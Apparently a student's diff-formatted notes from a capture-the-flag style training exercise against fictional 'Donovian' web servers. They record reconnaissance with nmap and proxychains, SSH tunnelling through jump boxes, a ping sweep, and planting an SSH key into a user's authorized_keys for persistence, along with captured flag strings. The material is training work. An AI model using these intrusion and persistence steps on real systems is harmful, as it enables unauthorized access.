@@ -194,6 +194,55 @@ www-data:x:33:33:www-data:/var/www:/bin/bash
 mkdir /var/www/directory/.ssh
 
 
+cat ~/.ssh/id_rsa.pub
+
+
+
+
+
+
+Objective: gain access to Minstry of Industry web servers.
+
+
+Tools/Techniques: 
+All connections will be established through SSH masquerades or web browser.
+Ports in use will be dependent on target location and are subject to change.
+Web exploitation techniques limited to cross-site scripting, command injection, file upload, and path transversal. 
+Network scanning tools/technique usage is at the discretion of student.
+
+
+Prior Approvals: 
+Development of SSH access on host: Donovian_MI_websvr. 
+Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.
+
+
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.40
+-->T2: ???
+
+Target Section:
+
+T1
+Hostname: Donovian_MI_websvr
+IP: 10.100.28.40
+OS: unknown
+Creds:unknown
+Last Known SSH Port: 4444
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.
+
+T2
+Hostname: Donovian_Training_Websvr
+IP: ???
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence
 
 
 
@@ -202,10 +251,216 @@ mkdir /var/www/directory/.ssh
 
 
 
+nmap 10.100.28.40
+
+ssh -S /tmp/jump jumpD -O forward -D9050
+
+proxychains nmap 10.100.28.40
+
+Nmap scan report for 10.100.28.40
+Host is up (0.00043s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+4444/tcp open  krb524
+
+Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
+
+
+proxychains nc 10.100.28.40 80
+
+HTTP/1.1 400 Bad Request
+Date: Wed, 18 Sep 2024 17:52:56 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 306
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.29 (Ubuntu) Server at mi.web.donovia Port 80</address>
+</body></html>
+
+
+proxychains nc 10.100.28.40 4444
+
+SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+
+ssh -S /tmp/jump jumpf -O forward -L8004:10.100.28.40:80 -L20001:10.100.28.40:4444
+ssh -S /tmp/jump jumpf -O cancel -L8004:10.100.28.40:80 -L20001:10.100.28.40:4444
+
+view-source:http://127.0.0.1:8004/robots.txt
+User-agent: *
+Disallow: /net_test
+
+
+proxychains nmap -T5 --script=http-enum 10.100.28.40
+
+PORT     STATE SERVICE
+80/tcp   open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+4444/tcp open  krb524
 
 
 
 
+http://127.0.0.1:8004/uploads/message
+
+Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
+Please send me a corrected cert with the right now.
+
+I took my online training from the following website
+
+10.100.28.55
+
+
+
+18:16:35 up 2 days,  4:21,  0 users,  load average: 0.03, 0.11, 0.15
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+billybob
+billybob:x:1001:1001:you found me NPYsvQZvFsoPs2dOWZeE:/home/billybob:/bin/bash
+
+
+mkdir /home/billybob/.ssh
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuiheEg7vzDqAJdMfRD54ErLV4WKFen6ePe8cnkR0JuhK4GLQxzQuA9CST0P3dBbq4GWZkT3i7VIVuo1XYHSabZRle2MRrsfD1Bd/hX+l5ACplrvWm6W8xJuImcK5WB95pvIgJ7ftgw5Q23b1yqEVpKj6vZfz0a20bWjIGH5S9lW/Kc4IrgBS876Gs76IYoZWaiTOGqcs4qRSmzIMPXAT+ojvSqkVMczs81vh2VbW5fchu6rPies7qBADGWotvHFdgmh+nwkT3tFJUQTN6qhYzvJmLt836Y4scMt3ifUNjOm0syBOghXf3D1SMYfp40ai0HFmIMERtp3zuuhQen9zN student@lin-ops
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuiheEg7vzDqAJdMfRD54ErLV4WKFen6ePe8cnkR0JuhK4GLQxzQuA9CST0P3dBbq4GWZkT3i7VIVuo1XYHSabZRle2MRrsfD1Bd/hX+l5ACplrvWm6W8xJuImcK5WB95pvIgJ7ftgw5Q23b1yqEVpKj6vZfz0a20bWjIGH5S9lW/Kc4IrgBS876Gs76IYoZWaiTOGqcs4qRSmzIMPXAT+ojvSqkVMczs81vh2VbW5fchu6rPies7qBADGWotvHFdgmh+nwkT3tFJUQTN6qhYzvJmLt836Y4scMt3ifUNjOm0syBOghXf3D1SMYfp40ai0HFmIMERtp3zuuhQen9zN student@lin-ops" >> /home/billybob/.ssh/authorized_keys
+cat /home/billybob/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCti8z3B5cqC1vkYd4aZ1WYXSnGTsQJ/KQmmZzz3onTUcoWd1Mty+2UshdN25YPWockRFSy3/uDgIHHbTuvc/skB8xmP+UPfJH3RXGM+QLGTabINoTlB/c8YL19NB5UqeXwt+l5VJff/Gvwh1NB79KYr7zNMsKCYOROfumQ+fCd/UhCBj2D3wBw5NBpBsgmJ8eUmRbLtZDauRPvfP0TE72I6v5SAirPSb1jrucm+iJ39wg7B5BTbEjs+nQSYGaTgyG1Cj7O87X9meohf9hA+f/Q/oP6s6Bm5Pr88YnbmLClGvLlDRgia58sWNrMWlvSbdEFXJv2EiJRRbK87b4W0BVL student@lin-ops" >> /home/billybob/.ssh/authorized_keys
+
+
+
+ssh -MS /tmp/T1 billybob@127.0.0.1 -p 20001
+
+
+proxychains nmap -T5 --script=http-enum 10.100.28.55
+
+billybob@mi:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc fq_codel state UP group default qlen 1000
+    link/ether fa:16:3e:3d:07:92 brd ff:ff:ff:ff:ff:ff
+    inet 10.100.28.40/27 brd 10.100.28.63 scope global dynamic ens3
+       valid_lft 57547sec preferred_lft 57547sec
+    inet6 fe80::f816:3eff:fe3d:792/64 scope link 
+       valid_lft forever preferred_lft forever
+
+
+
+billybob@mi:~$ for i in {1..254};do (ping -c 1 10.100.28.$i 2>/dev/null | grep "bytes from" &) ;done
+64 bytes from 10.100.28.33: icmp_seq=1 ttl=64 time=0.311 ms
+64 bytes from 10.100.28.35: icmp_seq=1 ttl=64 time=1.05 ms
+64 bytes from 10.100.28.37: icmp_seq=1 ttl=64 time=0.874 ms
+64 bytes from 10.100.28.40: icmp_seq=1 ttl=64 time=0.012 ms
+64 bytes from 10.100.28.48: icmp_seq=1 ttl=64 time=2.31 ms
+64 bytes from 10.100.28.55: icmp_seq=1 ttl=64 time=8.40 ms
+64 bytes from 10.100.28.34: icmp_seq=1 ttl=64 time=56.5 ms
+
+billybob@mi:~$ arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.100.28.38                     (incomplete)                              ens3
+10.100.28.57                     (incomplete)                              ens3
+10.100.28.56                     (incomplete)                              ens3
+10.100.28.59                     (incomplete)                              ens3
+10.100.28.58                     (incomplete)                              ens3
+10.100.28.61                     (incomplete)                              ens3
+10.100.28.60                     (incomplete)                              ens3
+10.100.28.62                     (incomplete)                              ens3
+10.100.28.41                     (incomplete)                              ens3
+10.100.28.49                     (incomplete)                              ens3
+10.100.28.48             ether   fa:16:3e:57:5f:0d   C                     ens3
+10.100.28.43                     (incomplete)                              ens3
+10.100.28.51                     (incomplete)                              ens3
+10.100.28.42                     (incomplete)                              ens3
+10.100.28.50                     (incomplete)                              ens3
+10.100.28.45                     (incomplete)                              ens3
+10.100.28.53                     (incomplete)                              ens3
+10.100.28.44                     (incomplete)                              ens3
+10.100.28.52                     (incomplete)                              ens3
+10.100.28.47                     (incomplete)                              ens3
+10.100.28.55             ether   fa:16:3e:b4:21:2e   C                     ens3
+10.100.28.46                     (incomplete)                              ens3
+10.100.28.54                     (incomplete)                              ens3
+_gateway                 ether   fa:16:3e:be:75:1e   C                     ens3
+10.100.28.35             ether   fa:16:3e:5c:84:0c   C                     ens3
+10.100.28.34             ether   fa:16:3e:76:f7:48   C                     ens3
+10.100.28.37             ether   fa:16:3e:2c:f0:b3   C                     ens3
+10.100.28.36                     (incomplete)                              ens3
+10.100.28.39                     (incomplete)                              ens3
+
+billybob@mi:~$ ip neigh
+10.100.28.38 dev ens3  FAILED
+10.100.28.57 dev ens3  FAILED
+10.100.28.56 dev ens3  FAILED
+10.100.28.59 dev ens3  FAILED
+10.100.28.58 dev ens3  FAILED
+10.100.28.61 dev ens3  FAILED
+10.100.28.60 dev ens3  FAILED
+10.100.28.62 dev ens3  FAILED
+10.100.28.41 dev ens3  FAILED
+10.100.28.49 dev ens3  FAILED
+10.100.28.48 dev ens3 lladdr fa:16:3e:57:5f:0d STALE
+10.100.28.43 dev ens3  FAILED
+10.100.28.51 dev ens3  FAILED
+10.100.28.42 dev ens3  FAILED
+10.100.28.50 dev ens3  FAILED
+10.100.28.45 dev ens3  FAILED
+10.100.28.53 dev ens3  FAILED
+10.100.28.44 dev ens3  FAILED
+10.100.28.52 dev ens3  FAILED
+10.100.28.47 dev ens3  FAILED
+10.100.28.55 dev ens3 lladdr fa:16:3e:b4:21:2e REACHABLE
+10.100.28.46 dev ens3  FAILED
+10.100.28.54 dev ens3  FAILED
+10.100.28.33 dev ens3 lladdr fa:16:3e:be:75:1e REACHABLE
+10.100.28.35 dev ens3 lladdr fa:16:3e:5c:84:0c STALE
+10.100.28.34 dev ens3 lladdr fa:16:3e:76:f7:48 STALE
+10.100.28.37 dev ens3 lladdr fa:16:3e:2c:f0:b3 STALE
+10.100.28.36 dev ens3  FAILED
+10.100.28.39 dev ens3  FAILED
+
+
+ssh -S /tmp/T1 T1f -O forward -L8005:10.100.28.55:80 
+-L20001:10.100.28.55:4444
+
+
+
+
+/var/www/html/net_test /var/www/html/net_test
+
+
+
+
+Od7xCa3vCvLVsQWKMqDG
+
+
+Nmap scan report for 10.100.28.55
+Host is up (0.015s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
 
 
 
